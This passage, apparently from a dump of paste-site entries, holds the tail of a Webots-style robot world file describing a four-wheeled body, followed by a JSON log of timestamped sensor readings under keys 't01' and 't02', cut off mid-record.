            translation 0.05 -0.05 6.163806434157709e-10
            rotation 0.9999999999999473 1.5926197332664142e-07 -2.823899364351547e-07 1.5700000008854709
            children [
              DEF wheel Shape {
                appearance PBRAppearance {
                  baseColor 1 0 0
                  roughness 1
                  metalness 0
                }
                geometry Cylinder {
                  height 0.01
                  radius 0.02
                }
              }
            ]
            name ""solid2""
            boundingObject DEF wheel Shape {
              appearance PBRAppearance {
                baseColor 1 0 0
                roughness 1
                metalness 0
              }
              geometry Cylinder {
                height 0.01
                radius 0.02
              }
            }
            physics Physics {
            }
          }
        }
        DEF Body Shape {
          appearance PBRAppearance {
            baseColor 0.145098 0.145098 0.145098
            roughness 1
            metalness 0
          }
          geometry Box {
            size 0.2 0.1 0.01
          }
        }
      ]
      name ""Body""
      boundingObject USE Body
      physics Physics {
      }
    }
  ]
  boundingObject USE Body
  physics Physics {
  }
  controller ""4wheel1controller""
}
"
58mm4WTW,Indications,MARSHAL327,JSON,Wednesday 28th of May 2025 09:59:00 AM CDT,"{
    ""t01"": [
        {
            ""date"": ""2025-02-17 15:15:02"",
            ""value"": 19.47
        },
        {
            ""date"": ""2025-02-21 16:20:02"",
            ""value"": 19.42
        },
        {
            ""date"": ""2025-02-21 16:25:02"",
            ""value"": 19.41
        },
        {
            ""date"": ""2025-02-24 13:20:03"",
            ""value"": 19.5
        },
        {
            ""date"": ""2025-02-24 13:25:02"",
            ""value"": 19.54
        },
        {
            ""date"": ""2025-02-24 13:40:03"",
            ""value"": 19.41
        },
        {
            ""date"": ""2025-02-24 10:40:00"",
            ""value"": 19.42
        },
        {
            ""date"": ""2025-02-24 10:45:00"",
            ""value"": 19.52
        },
        {
            ""date"": ""2025-02-24 10:50:00"",
            ""value"": 19.59
        },
        {
            ""date"": ""2025-02-24 10:55:00"",
            ""value"": 19.68
        },
        {
            ""date"": ""2025-02-24 11:00:00"",
            ""value"": 19.72
        },
        {
            ""date"": ""2025-02-24 11:05:00"",
            ""value"": 19.77
        },
        {
            ""date"": ""2025-02-24 11:10:00"",
            ""value"": 19.82
        },
        {
            ""date"": ""2025-02-24 11:15:00"",
            ""value"": 19.86
        },
        {
            ""date"": ""2025-02-24 11:20:00"",
            ""value"": 19.89
        },
        {
            ""date"": ""2025-02-24 11:26:00"",
            ""value"": 19.95
        },
        {
            ""date"": ""2025-02-24 11:31:00"",
            ""value"": 19.96
        },
        {
            ""date"": ""2025-02-24 11:35:00"",
            ""value"": 19.59
        },
        {
            ""date"": ""2025-02-24 12:00:00"",
            ""value"": 19.28
        },
        {
            ""date"": ""2025-02-24 16:00:02"",
            ""value"": 19.89
        },
        {
            ""date"": ""2025-02-24 16:05:03"",
            ""value"": 19.87
        },
        {
            ""date"": ""2025-02-24 16:10:04"",
            ""value"": 19.83
        },
        {
            ""date"": ""2025-02-24 16:15:02"",
            ""value"": 19.81
        },
        {
            ""date"": ""2025-02-24 16:20:03"",
            ""value"": 19.77
        },
        {
            ""date"": ""2025-03-07 11:30:03"",
            ""value"": 19.03
        },
        {
            ""date"": ""2025-03-07 08:45:00"",
            ""value"": 19.38
        },
        {
            ""date"": ""2025-03-12 14:50:03"",
            ""value"": 19.86
        },
        {
            ""date"": ""2025-03-13 17:50:02"",
            ""value"": 20.47
        },
        {
            ""date"": ""2025-03-13 18:00:03"",
            ""value"": 20.51
        },
        {
            ""date"": ""2025-03-13 18:05:02"",
            ""value"": 20.52
        },
        {
            ""date"": ""2025-03-18 19:10:02"",
            ""value"": 22.7
        },
        {
            ""date"": ""2025-03-18 16:15:00"",
            ""value"": 22.71
        },
        {
            ""date"": ""2025-03-18 16:20:00"",
            ""value"": 22.74
        },
        {
            ""date"": ""2025-03-18 19:25:02"",
            ""value"": 22.75
        },
        {
            ""date"": ""2025-03-18 16:27:00"",
            ""value"": 22.75
        },
        {
            ""date"": ""2025-03-18 16:32:00"",
            ""value"": 22.77
        },
        {
            ""date"": ""2025-03-18 16:37:00"",
            ""value"": 22.78
        },
        {
            ""date"": ""2025-03-18 16:42:00"",
            ""value"": 22.78
        },
        {
            ""date"": ""2025-03-18 16:47:00"",
            ""value"": 22.81
        },
        {
            ""date"": ""2025-03-18 16:52:00"",
            ""value"": 22.82
        },
        {
            ""date"": ""2025-03-18 16:57:00"",
            ""value"": 22.83
        },
        {
            ""date"": ""2025-03-18 17:02:00"",
            ""value"": 22.84
        },
        {
            ""date"": ""2025-03-18 17:08:00"",
            ""value"": 22.84
        },
        {
            ""date"": ""2025-03-20 10:25:02"",
            ""value"": 20.99
        },
        {
            ""date"": ""2025-03-20 07:25:00"",
            ""value"": 21.01
        },
        {
            ""date"": ""2025-03-20 10:30:02"",
            ""value"": 21.04
        },
        {
            ""date"": ""2025-03-20 07:31:00"",
            ""value"": 21.06
        },
        {
            ""date"": ""2025-03-20 07:36:00"",
            ""value"": 21.1
        },
        {
            ""date"": ""2025-03-20 07:41:00"",
            ""value"": 21.14
        },
        {
            ""date"": ""2025-03-20 10:50:03"",
            ""value"": 21.16
        },
        {
            ""date"": ""2025-03-20 10:55:01"",
            ""value"": 21.22
        },
        {
            ""date"": ""2025-03-20 10:55:02"",
            ""value"": 21.22
        },
        {
            ""date"": ""2025-03-20 07:56:00"",
            ""value"": 21.25
        },
        {
            ""date"": ""2025-03-20 08:01:00"",
            ""value"": 21.28
        },
        {
            ""date"": ""2025-03-20 11:07:54"",
            ""value"": 21.33
        },
        {
            ""date"": ""2025-03-20 11:10:02"",
            ""value"": 21.33
        },
        {
            ""date"": ""2025-03-20 08:09:00"",
            ""value"": 21.35
        },
        {
            ""date"": ""2025-03-20 08:14:00"",
            ""value"": 21.42
        },
        {
            ""date"": ""2025-03-20 08:19:00"",
            ""value"": 21.46
        },
        {
            ""date"": ""2025-03-20 08:24:00"",
            ""value"": 21.52
        },
        {
            ""date"": ""2025-03-20 08:29:00"",
            ""value"": 21.55
        },
        {
            ""date"": ""2025-03-20 08:34:00"",
            ""value"": 21.61
        },
        {
            ""date"": ""2025-03-20 08:39:00"",
            ""value"": 21.65
        },
        {
            ""date"": ""2025-03-20 08:44:00"",
            ""value"": 21.7
        },
        {
            ""date"": ""2025-03-20 08:49:00"",
            ""value"": 21.73
        },
        {
            ""date"": ""2025-03-20 08:54:00"",
            ""value"": 21.73
        },
        {
            ""date"": ""2025-03-20 08:59:00"",
            ""value"": 21.7
        },
        {
            ""date"": ""2025-03-20 09:03:00"",
            ""value"": 21.64
        },
        {
            ""date"": ""2025-03-20 10:00:00"",
            ""value"": 21.25
        },
        {
            ""date"": ""2025-03-20 11:00:00"",
            ""value"": 21.45
        },
        {
            ""date"": ""2025-03-20 17:07:32"",
            ""value"": 22.13
        },
        {
            ""date"": ""2025-03-20 17:10:02"",
            ""value"": 22.13
        },
        {
            ""date"": ""2025-03-20 14:13:00"",
            ""value"": 22.13
        },
        {
            ""date"": ""2025-03-20 14:18:00"",
            ""value"": 22.14
        },
        {
            ""date"": ""2025-03-20 14:23:00"",
            ""value"": 22.14
        },
        {
            ""date"": ""2025-03-20 14:28:00"",
            ""value"": 22.13
        },
        {
            ""date"": ""2025-03-20 14:33:00"",
            ""value"": 22.14
        },
        {
            ""date"": ""2025-03-20 14:38:00"",
            ""value"": 22.15
        },
        {
            ""date"": ""2025-03-20 14:43:00"",
            ""value"": 22.14
        },
        {
            ""date"": ""2025-03-20 14:48:00"",
            ""value"": 22.14
        },
        {
            ""date"": ""2025-03-20 14:53:00"",
            ""value"": 22.15
        },
        {
            ""date"": ""2025-03-20 14:58:00"",
            ""value"": 22.16
        },
        {
            ""date"": ""2025-03-20 15:03:00"",
            ""value"": 22.16
        },
        {
            ""date"": ""2025-03-20 15:07:00"",
            ""value"": 22.17
        },
        {
            ""date"": ""2025-03-21 11:45:03"",
            ""value"": 21.75
        },
        {
            ""date"": ""2025-03-21 11:53:42"",
            ""value"": 21.85
        },
        {
            ""date"": ""2025-03-21 11:55:02"",
            ""value"": 21.85
        },
        {
            ""date"": ""2025-03-21 08:54:00"",
            ""value"": 21.88
        },
        {
            ""date"": ""2025-03-21 08:59:00"",
            ""value"": 21.9
        },
        {
            ""date"": ""2025-03-21 12:04:36"",
            ""value"": 21.91
        },
        {
            ""date"": ""2025-03-21 12:05:10"",
            ""value"": 21.91
        },
        {
            ""date"": ""2025-03-21 09:05:00"",
            ""value"": 21.92
        },
        {
            ""date"": ""2025-03-21 09:10:00"",
            ""value"": 21.93
        },
        {
            ""date"": ""2025-03-21 09:15:00"",
            ""value"": 21.95
        },
        {
            ""date"": ""2025-03-21 09:20:00"",
            ""value"": 21.96
        },
        {
            ""date"": ""2025-03-21 09:25:00"",
            ""value"": 21.99
        },
        {
            ""date"": ""2025-03-21 09:31:00"",
            ""value"": 22.02
        },
        {
            ""date"": ""2025-03-21 09:36:00"",
            ""value"": 22.03
        },
        {
            ""date"": ""2025-03-21 14:18:56"",
            ""value"": 22.2
        },
        {
            ""date"": ""2025-03-21 14:20:02"",
            ""value"": 22.2
        },
        {
            ""date"": ""2025-03-21 11:20:00"",
            ""value"": 22.19
        },
        {
            ""date"": ""2025-03-21 11:25:00"",
            ""value"": 22.2
        },
        {
            ""date"": ""2025-03-21 11:30:00"",
            ""value"": 22.2
        },
        {
            ""date"": ""2025-03-21 11:35:00"",
            ""value"": 22.21
        },
        {
            ""date"": ""2025-03-21 11:40:00"",
            ""value"": 22.24
        },
        {
            ""date"": ""2025-03-21 11:44:00"",
            ""value"": 22.25
        },
        {
            ""date"": ""2025-03-21 12:00:00"",
            ""value"": 22.26
        },
        {
            ""date"": ""2025-03-21 13:00:00"",
            ""value"": 21.56
        },
        {
            ""date"": ""2025-03-21 16:18:18"",
            ""value"": 21.4
        },
        {
            ""date"": ""2025-03-21 16:20:02"",
            ""value"": 21.4
        },
        {
            ""date"": ""2025-03-21 13:19:00"",
            ""value"": 21.37
        },
        {
            ""date"": ""2025-03-21 13:24:00"",
            ""value"": 21.37
        },
        {
            ""date"": ""2025-03-21 17:02:16"",
            ""value"": 21.22
        },
        {
            ""date"": ""2025-03-21 14:03:00"",
            ""value"": 21.22
        },
        {
            ""date"": ""2025-03-21 17:05:02"",
            ""value"": 21.22
        },
        {
            ""date"": ""2025-03-21 14:08:00"",
            ""value"": 21.2
        },
        {
            ""date"": ""2025-03-21 14:13:00"",
            ""value"": 21.19
        },
        {
            ""date"": ""2025-03-21 14:18:00"",
            ""value"": 21.17
        },
        {
            ""date"": ""2025-03-21 14:23:00"",
            ""value"": 21.16
        },
        {
            ""date"": ""2025-03-21 14:28:00"",
            ""value"": 21.13
        },
        {
            ""date"": ""2025-03-21 14:33:00"",
            ""value"": 21.13
        },
        {
            ""date"": ""2025-03-21 14:38:00"",
            ""value"": 21.1
        },
        {
            ""date"": ""2025-03-21 14:43:00"",
            ""value"": 21.09
        },
        {
            ""date"": ""2025-03-21 14:48:00"",
            ""value"": 21.09
        },
        {
            ""date"": ""2025-03-21 14:53:00"",
            ""value"": 21.1
        },
        {
            ""date"": ""2025-03-21 14:57:00"",
            ""value"": 21.14
        },
        {
            ""date"": ""2025-03-21 16:00:00"",
            ""value"": 20.99
        },
        {
            ""date"": ""2025-03-21 19:52:31"",
            ""value"": 20.88
        },
        {
            ""date"": ""2025-03-21 19:55:02"",
            ""value"": 20.88
        },
        {
            ""date"": ""2025-03-21 16:58:00"",
            ""value"": 20.86
        },
        {
            ""date"": ""2025-03-21 17:03:00"",
            ""value"": 20.86
        },
        {
            ""date"": ""2025-03-21 17:08:00"",
            ""value"": 20.89
        },
        {
            ""date"": ""2025-03-21 17:13:00"",
            ""value"": 20.92
        },
        {
            ""date"": ""2025-03-21 17:18:00"",
            ""value"": 20.94
        },
        {
            ""date"": ""2025-03-21 17:23:00"",
            ""value"": 20.96
        },
        {
            ""date"": ""2025-03-21 17:28:00"",
            ""value"": 21.0
        },
        {
            ""date"": ""2025-03-21 17:33:00"",
            ""value"": 21.02
        },
        {
            ""date"": ""2025-03-21 17:38:00"",
            ""value"": 21.05
        },
        {
            ""date"": ""2025-03-21 17:43:00"",
            ""value"": 21.06
        },
        {
            ""date"": ""2025-03-21 17:48:00"",
            ""value"": 21.08
        },
        {
            ""date"": ""2025-03-21 17:52:00"",
            ""value"": 21.1
        },
        {
            ""date"": ""2025-03-21 18:00:00"",
            ""value"": 21.12
        },
        {
            ""date"": ""2025-03-21 19:00:00"",
            ""value"": 21.11
        },
        {
            ""date"": ""2025-03-21 20:00:00"",
            ""value"": 21.0
        },
        {
            ""date"": ""2025-03-21 21:00:00"",
            ""value"": 20.8
        },
        {
            ""date"": ""2025-03-21 22:00:00"",
            ""value"": 20.69
        },
        {
            ""date"": ""2025-03-22 03:00:00"",
            ""value"": 20.45
        },
        {
            ""date"": ""2025-03-22 04:00:00"",
            ""value"": 20.39
        },
        {
            ""date"": ""2025-03-22 05:00:00"",
            ""value"": 20.3
        },
        {
            ""date"": ""2025-03-22 06:00:00"",
            ""value"": 20.48
        },
        {
            ""date"": ""2025-03-22 07:00:00"",
            ""value"": 20.66
        },
        {
            ""date"": ""2025-03-22 08:00:00"",
            ""value"": 20.86
        },
        {
            ""date"": ""2025-03-22 09:00:00"",
            ""value"": 21.08
        },
        {
            ""date"": ""2025-03-22 10:00:00"",
            ""value"": 21.04
        },
        {
            ""date"": ""2025-03-22 11:00:00"",
            ""value"": 21.0
        },
        {
            ""date"": ""2025-03-22 12:00:00"",
            ""value"": 20.97
        },
        {
            ""date"": ""2025-03-22 13:00:00"",
            ""value"": 20.94
        },
        {
            ""date"": ""2025-03-22 14:00:00"",
            ""value"": 20.9
        },
        {
            ""date"": ""2025-03-22 15:00:00"",
            ""value"": 20.87
        },
        {
            ""date"": ""2025-03-22 16:00:00"",
            ""value"": 20.81
        },
        {
            ""date"": ""2025-03-22 17:00:00"",
            ""value"": 20.73
        },
        {
            ""date"": ""2025-03-22 18:00:00"",
            ""value"": 20.63
        },
        {
            ""date"": ""2025-03-22 19:00:00"",
            ""value"": 20.53
        },
        {
            ""date"": ""2025-03-22 20:00:00"",
            ""value"": 20.44
        },
        {
            ""date"": ""2025-03-22 21:00:00"",
            ""value"": 20.33
        },
        {
            ""date"": ""2025-03-22 22:00:00"",
            ""value"": 20.22
        },
        {
            ""date"": ""2025-03-23 03:00:00"",
            ""value"": 19.78
        },
        {
            ""date"": ""2025-03-23 04:00:00"",
            ""value"": 19.69
        },
        {
            ""date"": ""2025-03-23 05:00:00"",
            ""value"": 19.7
        },
        {
            ""date"": ""2025-03-23 06:00:00"",
            ""value"": 19.97
        },
        {
            ""date"": ""2025-03-23 07:00:00"",
            ""value"": 20.25
        },
        {
            ""date"": ""2025-03-23 08:00:00"",
            ""value"": 20.75
        },
        {
            ""date"": ""2025-03-23 09:00:00"",
            ""value"": 21.0
        },
        {
            ""date"": ""2025-03-23 10:00:00"",
            ""value"": 20.98
        },
        {
            ""date"": ""2025-03-23 11:00:00"",
            ""value"": 20.89
        },
        {
            ""date"": ""2025-03-23 12:00:00"",
            ""value"": 20.81
        },
        {
            ""date"": ""2025-03-23 13:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-03-23 14:00:00"",
            ""value"": 20.75
        },
        {
            ""date"": ""2025-03-23 15:00:00"",
            ""value"": 20.7
        },
        {
            ""date"": ""2025-03-23 16:00:00"",
            ""value"": 20.61
        },
        {
            ""date"": ""2025-03-23 17:00:00"",
            ""value"": 20.52
        },
        {
            ""date"": ""2025-03-23 18:00:00"",
            ""value"": 20.43
        },
        {
            ""date"": ""2025-03-23 19:00:00"",
            ""value"": 20.31
        },
        {
            ""date"": ""2025-03-23 20:00:00"",
            ""value"": 20.23
        },
        {
            ""date"": ""2025-03-23 21:00:00"",
            ""value"": 20.18
        },
        {
            ""date"": ""2025-03-23 22:00:00"",
            ""value"": 20.13
        },
        {
            ""date"": ""2025-03-24 03:00:00"",
            ""value"": 19.95
        },
        {
            ""date"": ""2025-03-24 04:00:00"",
            ""value"": 19.9
        },
        {
            ""date"": ""2025-03-24 05:00:00"",
            ""value"": 19.89
        },
        {
            ""date"": ""2025-03-24 06:00:00"",
            ""value"": 20.13
        },
        {
            ""date"": ""2025-03-24 07:00:00"",
            ""value"": 20.53
        },
        {
            ""date"": ""2025-03-24 08:00:00"",
            ""value"": 21.11
        },
        {
            ""date"": ""2025-03-24 09:00:00"",
            ""value"": 21.73
        },
        {
            ""date"": ""2025-03-24 10:00:00"",
            ""value"": 21.64
        },
        {
            ""date"": ""2025-03-24 11:00:00"",
            ""value"": 21.58
        },
        {
            ""date"": ""2025-03-24 12:00:00"",
            ""value"": 21.73
        },
        {
            ""date"": ""2025-03-24 13:00:00"",
            ""value"": 21.6
        },
        {
            ""date"": ""2025-03-24 16:14:02"",
            ""value"": 21.54
        },
        {
            ""date"": ""2025-03-24 16:15:03"",
            ""value"": 21.54
        },
        {
            ""date"": ""2025-03-24 16:20:02"",
            ""value"": 21.53
        },
        {
            ""date"": ""2025-03-24 16:25:02"",
            ""value"": 21.54
        },
        {
            ""date"": ""2025-03-24 17:10:02"",
            ""value"": 21.81
        },
        {
            ""date"": ""2025-03-24 17:15:03"",
            ""value"": 21.73
        },
        {
            ""date"": ""2025-03-24 17:20:02"",
            ""value"": 21.61
        },
        {
            ""date"": ""2025-03-25 13:45:02"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-03-25 13:50:03"",
            ""value"": 20.83
        },
        {
            ""date"": ""2025-03-25 14:00:02"",
            ""value"": 21.1
        },
        {
            ""date"": ""2025-03-25 14:05:15"",
            ""value"": 21.0
        },
        {
            ""date"": ""2025-03-25 14:10:03"",
            ""value"": 20.89
        },
        {
            ""date"": ""2025-03-25 14:30:02"",
            ""value"": 20.87
        },
        {
            ""date"": ""2025-03-25 14:45:02"",
            ""value"": 20.97
        },
        {
            ""date"": ""2025-03-25 14:50:02"",
            ""value"": 20.95
        },
        {
            ""date"": ""2025-03-25 14:55:02"",
            ""value"": 20.95
        },
        {
            ""date"": ""2025-03-25 15:15:07"",
            ""value"": 20.91
        },
        {
            ""date"": ""2025-03-27 14:10:03"",
            ""value"": 22.28
        },
        {
            ""date"": ""2025-03-27 14:12:19"",
            ""value"": 22.08
        },
        {
            ""date"": ""2025-03-27 14:15:03"",
            ""value"": 22.11
        },
        {
            ""date"": ""2025-03-27 14:21:15"",
            ""value"": 21.87
        },
        {
            ""date"": ""2025-03-27 14:22:54"",
            ""value"": 21.85
        },
        {
            ""date"": ""2025-03-27 14:25:03"",
            ""value"": 21.87
        },
        {
            ""date"": ""2025-03-27 14:30:03"",
            ""value"": 21.77
        },
        {
            ""date"": ""2025-03-28 15:33:06"",
            ""value"": 21.44
        },
        {
            ""date"": ""2025-03-28 15:35:03"",
            ""value"": 21.44
        },
        {
            ""date"": ""2025-03-28 12:34:00"",
            ""value"": 21.46
        },
        {
            ""date"": ""2025-04-04 10:30:02"",
            ""value"": 13.49
        },
        {
            ""date"": ""2025-04-04 07:43:00"",
            ""value"": 13.98
        },
        {
            ""date"": ""2025-04-04 11:20:02"",
            ""value"": 15.09
        },
        {
            ""date"": ""2025-04-04 18:40:03"",
            ""value"": 20.14
        },
        {
            ""date"": ""2025-04-04 18:55:02"",
            ""value"": 20.39
        },
        {
            ""date"": ""2025-04-04 19:20:02"",
            ""value"": 19.78
        },
        {
            ""date"": ""2025-04-04 19:25:03"",
            ""value"": 19.64
        },
        {
            ""date"": ""2025-04-04 19:30:03"",
            ""value"": 19.48
        },
        {
            ""date"": ""2025-04-04 16:40:00"",
            ""value"": 19.17
        },
        {
            ""date"": ""2025-04-04 16:50:00"",
            ""value"": 18.85
        },
        {
            ""date"": ""2025-04-04 17:41:00"",
            ""value"": 19.63
        },
        {
            ""date"": ""2025-04-04 18:11:00"",
            ""value"": 20.09
        },
        {
            ""date"": ""2025-04-04 18:20:00"",
            ""value"": 20.21
        },
        {
            ""date"": ""2025-04-04 19:00:00"",
            ""value"": 20.5
        },
        {
            ""date"": ""2025-04-04 20:00:00"",
            ""value"": 20.72
        },
        {
            ""date"": ""2025-04-04 21:00:00"",
            ""value"": 20.81
        },
        {
            ""date"": ""2025-04-04 22:00:00"",
            ""value"": 20.84
        },
        {
            ""date"": ""2025-04-04 23:00:00"",
            ""value"": 20.84
        },
        {
            ""date"": ""2025-04-05 00:00:00"",
            ""value"": 20.84
        },
        {
            ""date"": ""2025-04-05 01:00:00"",
            ""value"": 20.84
        },
        {
            ""date"": ""2025-04-05 02:00:00"",
            ""value"": 20.81
        },
        {
            ""date"": ""2025-04-05 03:00:00"",
            ""value"": 20.81
        },
        {
            ""date"": ""2025-04-05 04:00:00"",
            ""value"": 20.79
        },
        {
            ""date"": ""2025-04-05 05:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-04-05 06:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-04-05 08:00:00"",
            ""value"": 20.81
        },
        {
            ""date"": ""2025-04-05 09:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-04-05 10:00:00"",
            ""value"": 20.82
        },
        {
            ""date"": ""2025-04-05 11:00:00"",
            ""value"": 20.89
        },
        {
            ""date"": ""2025-04-05 12:00:00"",
            ""value"": 20.9
        },
        {
            ""date"": ""2025-04-05 13:00:00"",
            ""value"": 20.9
        },
        {
            ""date"": ""2025-04-05 14:00:00"",
            ""value"": 20.86
        },
        {
            ""date"": ""2025-04-05 15:00:00"",
            ""value"": 20.81
        },
        {
            ""date"": ""2025-04-05 16:00:00"",
            ""value"": 20.76
        },
        {
            ""date"": ""2025-04-05 17:00:00"",
            ""value"": 20.7
        },
        {
            ""date"": ""2025-04-05 18:00:00"",
            ""value"": 20.65
        },
        {
            ""date"": ""2025-04-05 19:00:00"",
            ""value"": 20.61
        },
        {
            ""date"": ""2025-04-05 20:00:00"",
            ""value"": 20.57
        },
        {
            ""date"": ""2025-04-05 21:00:00"",
            ""value"": 20.54
        },
        {
            ""date"": ""2025-04-05 22:00:00"",
            ""value"": 20.5
        },
        {
            ""date"": ""2025-04-05 23:00:00"",
            ""value"": 20.48
        },
        {
            ""date"": ""2025-04-06 00:00:00"",
            ""value"": 20.44
        },
        {
            ""date"": ""2025-04-06 01:00:00"",
            ""value"": 20.42
        },
        {
            ""date"": ""2025-04-06 02:00:00"",
            ""value"": 20.4
        },
        {
            ""date"": ""2025-04-06 03:00:00"",
            ""value"": 20.38
        },
        {
            ""date"": ""2025-04-06 04:00:00"",
            ""value"": 20.34
        },
        {
            ""date"": ""2025-04-06 05:00:00"",
            ""value"": 20.33
        },
        {
            ""date"": ""2025-04-06 06:00:00"",
            ""value"": 20.36
        },
        {
            ""date"": ""2025-04-06 07:00:00"",
            ""value"": 20.39
        },
        {
            ""date"": ""2025-04-06 08:00:00"",
            ""value"": 20.44
        },
        {
            ""date"": ""2025-04-06 09:00:00"",
            ""value"": 20.61
        },
        {
            ""date"": ""2025-04-06 10:00:00"",
            ""value"": 20.71
        },
        {
            ""date"": ""2025-04-06 11:00:00"",
            ""value"": 20.77
        },
        {
            ""date"": ""2025-04-06 12:00:00"",
            ""value"": 20.82
        },
        {
            ""date"": ""2025-04-06 13:00:00"",
            ""value"": 20.83
        },
        {
            ""date"": ""2025-04-06 14:00:00"",
            ""value"": 20.84
        },
        {
            ""date"": ""2025-04-06 15:00:00"",
            ""value"": 20.81
        },
        {
            ""date"": ""2025-04-06 16:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-04-06 17:00:00"",
            ""value"": 20.74
        },
        {
            ""date"": ""2025-04-06 18:00:00"",
            ""value"": 20.7
        },
        {
            ""date"": ""2025-04-06 19:00:00"",
            ""value"": 20.67
        },
        {
            ""date"": ""2025-04-06 20:00:00"",
            ""value"": 20.64
        },
        {
            ""date"": ""2025-04-06 21:00:00"",
            ""value"": 20.61
        },
        {
            ""date"": ""2025-04-06 22:00:00"",
            ""value"": 20.59
        },
        {
            ""date"": ""2025-04-06 23:00:00"",
            ""value"": 20.56
        },
        {
            ""date"": ""2025-04-07 00:00:00"",
            ""value"": 20.54
        },
        {
            ""date"": ""2025-04-07 01:00:00"",
            ""value"": 20.52
        },
        {
            ""date"": ""2025-04-07 02:00:00"",
            ""value"": 20.5
        },
        {
            ""date"": ""2025-04-07 03:00:00"",
            ""value"": 20.47
        },
        {
            ""date"": ""2025-04-07 04:00:00"",
            ""value"": 20.44
        },
        {
            ""date"": ""2025-04-07 05:00:00"",
            ""value"": 20.42
        },
        {
            ""date"": ""2025-04-07 06:00:00"",
            ""value"": 20.38
        },
        {
            ""date"": ""2025-04-07 07:00:00"",
            ""value"": 20.35
        },
        {
            ""date"": ""2025-04-07 08:00:00"",
            ""value"": 18.17
        },
        {
            ""date"": ""2025-04-07 09:00:00"",
            ""value"": 15.26
        },
        {
            ""date"": ""2025-04-07 12:23:10"",
            ""value"": 16.17
        },
        {
            ""date"": ""2025-04-07 12:25:02"",
            ""value"": 16.17
        },
        {
            ""date"": ""2025-04-07 09:28:00"",
            ""value"": 16.38
        },
        {
            ""date"": ""2025-04-07 09:38:00"",
            ""value"": 16.82
        },
        {
            ""date"": ""2025-04-07 13:25:02"",
            ""value"": 19.41
        },
        {
            ""date"": ""2025-04-07 13:30:03"",
            ""value"": 20.0
        }
    ],
    ""t02"": [
        {
            ""date"": ""2025-02-17 15:15:02"",
            ""value"": 19.37
        },
        {
            ""date"": ""2025-02-21 16:20:02"",
            ""value"": 19.38
        },
        {
            ""date"": ""2025-02-21 16:25:02"",
            ""value"": 19.38
        },
        {
            ""date"": ""2025-02-24 13:20:03"",
            ""value"": 19.53
        },
        {
            ""date"": ""2025-02-24 13:25:02"",
            ""value"": 19.54
        },
        {
            ""date"": ""2025-02-24 13:40:03"",
            ""value"": 19.48
        },
        {
            ""date"": ""2025-02-24 10:40:00"",
            ""value"": 19.48
        },
        {
            ""date"": ""2025-02-24 10:45:00"",
            ""value"": 19.49
        },
        {
            ""date"": ""2025-02-24 10:50:00"",
            ""value"": 19.54
        },
        {
            ""date"": ""2025-02-24 10:55:00"",
            ""value"": 19.6
        },
        {
            ""date"": ""2025-02-24 11:00:00"",
            ""value"": 19.65
        },
        {
            ""date"": ""2025-02-24 11:05:00"",
            ""value"": 19.7
        },
        {
            ""date"": ""2025-02-24 11:10:00"",
            ""value"": 19.74
        },
        {
            ""date"": ""2025-02-24 11:15:00"",
            ""value"": 19.79
        },
        {
            ""date"": ""2025-02-24 11:20:00"",
            ""value"": 19.82
        },
        {
            ""date"": ""2025-02-24 11:26:00"",
            ""value"": 19.87
        },
        {
            ""date"": ""2025-02-24 11:31:00"",
            ""value"": 19.91
        },
        {
            ""date"": ""2025-02-24 11:35:00"",
            ""value"": 19.81
        },
        {
            ""date"": ""2025-02-24 12:00:00"",
            ""value"": 19.4
        },
        {
            ""date"": ""2025-02-24 16:00:02"",
            ""value"": 19.92
        },
        {
            ""date"": ""2025-02-24 16:05:03"",
            ""value"": 19.92
        },
        {
            ""date"": ""2025-02-24 16:10:04"",
            ""value"": 19.89
        },
        {
            ""date"": ""2025-02-24 16:15:02"",
            ""value"": 19.87
        },
        {
            ""date"": ""2025-02-24 16:20:03"",
            ""value"": 19.82
        },
        {
            ""date"": ""2025-03-07 11:30:03"",
            ""value"": 18.84
        },
        {
            ""date"": ""2025-03-07 08:45:00"",
            ""value"": 19.19
        },
        {
            ""date"": ""2025-03-12 14:50:03"",
            ""value"": 19.71
        },
        {
            ""date"": ""2025-03-13 17:50:02"",
            ""value"": 20.54
        },
        {
            ""date"": ""2025-03-13 18:00:03"",
            ""value"": 20.53
        },
        {
            ""date"": ""2025-03-13 18:05:02"",
            ""value"": 20.51
        },
        {
            ""date"": ""2025-03-18 19:10:02"",
            ""value"": 22.58
        },
        {
            ""date"": ""2025-03-18 16:15:00"",
            ""value"": 22.58
        },
        {
            ""date"": ""2025-03-18 16:20:00"",
            ""value"": 22.59
        },
        {
            ""date"": ""2025-03-18 19:25:02"",
            ""value"": 22.6
        },
        {
            ""date"": ""2025-03-18 16:27:00"",
            ""value"": 22.6
        },
        {
            ""date"": ""2025-03-18 16:32:00"",
            ""value"": 22.62
        },
        {
            ""date"": ""2025-03-18 16:37:00"",
            ""value"": 22.63
        },
        {
            ""date"": ""2025-03-18 16:42:00"",
            ""value"": 22.63
        },
        {
            ""date"": ""2025-03-18 16:47:00"",
            ""value"": 22.65
        },
        {
            ""date"": ""2025-03-18 16:52:00"",
            ""value"": 22.66
        },
        {
            ""date"": ""2025-03-18 16:57:00"",
            ""value"": 22.67
        },
        {
            ""date"": ""2025-03-18 17:02:00"",
            ""value"": 22.68
        },
        {
            ""date"": ""2025-03-18 17:08:00"",
            ""value"": 22.68
        },
        {
            ""date"": ""2025-03-20 10:25:02"",
            ""value"": 20.76
        },
        {
            ""date"": ""2025-03-20 07:25:00"",
            ""value"": 20.79
        },
        {
            ""date"": ""2025-03-20 10:30:02"",
            ""value"": 20.81
        },
        {
            ""date"": ""2025-03-20 07:31:00"",
            ""value"": 20.83
        },
        {
            ""date"": ""2025-03-20 07:36:00"",
            ""value"": 20.89
        },
        {
            ""date"": ""2025-03-20 07:41:00"",
            ""value"": 20.92
        },
        {
            ""date"": ""2025-03-20 10:50:03"",
            ""value"": 20.94
        },
        {
            ""date"": ""2025-03-20 10:55:01"",
            ""value"": 21.01
        },
        {
            ""date"": ""2025-03-20 10:55:02"",
            ""value"": 21.01
        },
        {
            ""date"": ""2025-03-20 07:56:00"",
            ""value"": 21.03
        },
        {
            ""date"": ""2025-03-20 08:01:00"",
            ""value"": 21.07
        },
        {
            ""date"": ""2025-03-20 11:07:54"",
            ""value"": 21.12
        },
        {
            ""date"": ""2025-03-20 11:10:02"",
            ""value"": 21.12
        },
        {
            ""date"": ""2025-03-20 08:09:00"",
